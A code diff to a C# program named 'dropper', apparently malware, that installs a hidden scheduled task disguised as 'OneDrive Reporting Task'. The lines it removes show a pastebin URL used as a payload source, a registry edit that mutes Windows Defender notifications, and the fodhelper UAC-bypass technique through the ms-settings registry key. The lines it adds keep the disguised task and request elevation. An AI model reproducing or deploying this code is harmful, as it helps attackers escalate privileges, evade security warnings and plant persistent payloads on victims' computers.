@@ -8,7 +8,7 @@ namespace dropper
 {
     internal class Program
     {
-        private static string token = "https://pastebin.com/raw/xs0Q8kzv";
+        private static string token = "";
         private static string prefix = "";
         private static string geolock = "";
 
@@ -30,8 +30,6 @@ namespace dropper
             string error = schproc.StandardError.ReadToEnd();
             schproc.WaitForExit();
             if (error == string.Empty) Environment.Exit(1);
-
-            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", 0);
 
             string xmlpath = Path.GetTempFileName();
             File.WriteAllText(xmlpath,
@@ -78,29 +76,21 @@ namespace dropper
 
             Process.Start(new ProcessStartInfo()
             {
-                FileName = "cmd.exe",
-                Arguments = @"/c reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d ""schtasks /create /tn \""OneDrive Reporting Task\"" /xml " + xmlpath + @""" /t REG_SZ /f",
-                WindowStyle = ProcessWindowStyle.Hidden
+                FileName = "schtasks.exe",
+                Arguments = "/create /tn \"OneDrive Reporting Task\" /xml " + xmlpath,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                Verb = "runas"
             }).WaitForExit();
-
-            Process.Start(new ProcessStartInfo()
-            {
-                FileName = "fodhelper.exe",
-                WindowStyle = ProcessWindowStyle.Hidden
-            }).WaitForExit();
-
-            Thread.Sleep(1000);
 
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "schtasks.exe",
                 Arguments = "/run /i /tn \"OneDrive Reporting Task\"",
-                WindowStyle = ProcessWindowStyle.Hidden
+                WindowStyle = ProcessWindowStyle.Hidden,
+                Verb = "runas"
             }).WaitForExit();
 
             File.Delete(xmlpath);
-            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", true).DeleteValue("Enabled");
-            Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
         }
     }
 }
